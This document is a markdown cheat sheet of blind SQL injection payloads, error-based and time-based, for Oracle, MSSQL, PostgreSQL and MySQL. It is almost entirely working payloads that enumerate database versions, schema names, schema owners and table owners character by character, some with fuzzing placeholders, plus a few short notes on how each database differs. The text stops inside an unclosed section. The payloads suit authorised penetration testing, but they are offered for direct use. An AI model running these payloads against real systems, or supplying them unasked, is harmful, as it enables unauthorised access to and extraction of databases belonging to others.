# SQL Injection Payloads

## Information Inference

## Enumerate Version

### Oracle (error based)

```sql
((SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT rownum rn, table_name FROM all_tables) WHERE rn = ^FUZZ^),1,1)='^FUZZ^' THEN TO_CHAR(1/0) ELSE NULL END FROM dual))
```

### Oracle (time based)

```sql
((SELECT CASE WHEN SUBSTR((SELECT table_name FROM (SELECT rownum rn, table_name FROM all_tables) WHERE rn = ^FUZZ^),1,1)='^FUZZ^' THEN dbms_pipe.receive(('a'),10) ELSE NULL END FROM dual))
```

### MSSQL (error based)

```sql
IF ((SELECT SUBSTRING((SELECT @@version),1,1))='m') BEGIN THROW 500001, 'THING', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT SUBSTRING((SELECT @@version),1,1))='m') WAITFOR DELAY '0:0:02'
```

<aside>
ðŸ’¡ PostgreSQL does not have a way to trigger conditional errors without being inside a function or a DO block. Both of which have a lot of likely bad characters.

</aside>

### PostgreSQL (error based)

```sql
SELECT CASE WHEN (SELECT SUBSTRING((SELECT version()), 1, 1))='P' THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based)

```sql
SELECT CASE WHEN (SELECT SUBSTRING((SELECT version()), 1, 1))='P' THEN (SELECT pg_sleep(5)) ELSE NULL END
```

### MySQL (error based)

```sql
SELECT IF ((SELECT SUBSTRING((SELECT @@version),1,1))='8', (SELECT table_name FROM information_schema.tables), 'a') AS Result;
```

### MySQL (time based)

```sql
SELECT IF ((SELECT SUBSTRING((SELECT @@version),1,1))='8', (SELECT SLEEP(2)), (SELECT 'A')) AS Result;
```

## Enumerate rows returned of distinct table owners

### Oracle (error based)

```sql
((SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROWNUM RN, COLUMN_NAME, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'HS_BULKLOAD_VIEW_OBJ'))=2 THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL))
```

### Oracle (time based)

```sql
((SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROWNUM RN, COLUMN_NAME, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'HS_BULKLOAD_VIEW_OBJ'))=2 THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL))
```

<aside>
ðŸ’¡ MSSQL works a little differently, you have to enumerate schema names and the owners of those respective schemas.

</aside>

### MSSQL (error based)

```sql
IF ((SELECT MAX(RN) FROM (SELECT DISTINCT owner_name AS owner, RN FROM (SELECT RN, owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS subquery) AS mainquery) AS thing))=12 BEGIN THROW 500001, 'THING', 1; END
```

### MSSQL (time based)

```sql
IF ((SELECT MAX(RN) FROM (SELECT DISTINCT owner_name AS owner, RN FROM (SELECT RN, owner_name FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN, schema_name, owner_name FROM (SELECT name AS schema_name, USER_NAME(principal_id) AS owner_name FROM sys.schemas) AS thing) AS subquery) AS mainquery) AS thing))=12 WAITFOR DELAY '0:0:02'
```

<aside>
ðŸ’¡ PostgreSQL works similar to MSSQL where you have to enumerate the schema name, schema owner, and then use the results to determine what youâ€™re able to access.

</aside>

### PostgreSQL (error based) (schema names)

```sql
(SELECT CASE WHEN (SELECT MAX(RN) AS RN FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN FROM (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS THING) AS THING)=3 THEN 1/(SELECT 0) ELSE NULL END)
```

### PostgreSQL (time based) (schema names)

```sql
(SELECT CASE WHEN (SELECT MAX(RN) AS RN FROM (SELECT ROW_NUMBER() OVER (ORDER BY table_schema) AS RN FROM (SELECT DISTINCT(table_schema) AS table_schema FROM information_schema.tables) AS THING) AS THING)=3 THEN (SELECT pg_sleep(5)) ELSE NULL END)
```

### PostgreSQL (error based) (schema owners)

```sql
SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS thing) AS subquery)=6 THEN 1/(SELECT 0) ELSE NULL END
```

### PostgreSQL (time based) (schema owners)

```sql
SELECT CASE WHEN (SELECT MAX(RN) FROM (SELECT ROW_NUMBER() OVER (ORDER BY owner_name) AS RN FROM (SELECT nspname AS schema_name, pg_roles.rolname AS owner_name FROM pg_namespace JOIN pg_roles ON pg_namespace.nspowner = pg_roles.oid) AS thing) AS subquery)=6 THEN (SELECT pg_sleep(10)) ELSE NULL END
```

<aside>
ðŸ’¡ In MySQL there is no direct way to determine ownership of tables or schemas like in the other DBMSâ€™s.

## Enumerate Table Owners

### Oracle (error based)

```sql
(SELECT CASE WHEN SUBSTR((SELECT OWNER FROM (SELECT ROWNUM RN, OWNER FROM (SELECT DISTINCT OWNER FROM (SELECT ROWNUM RN, OWNER FROM ALL_TABLES))) WHERE RN = 1),1,1)='A' THEN TO_CHAR(1/0) ELSE NULL END FROM DUAL)
```

### Oracle (time based)

```sql
(SELECT CASE WHEN SUBSTR((SELECT OWNER FROM (SELECT ROWNUM RN, OWNER FROM (SELECT DISTINCT OWNER FROM (SELECT ROWNUM RN, OWNER FROM ALL_TABLES))) WHERE RN = 1),1,1)='A' THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM DUAL)
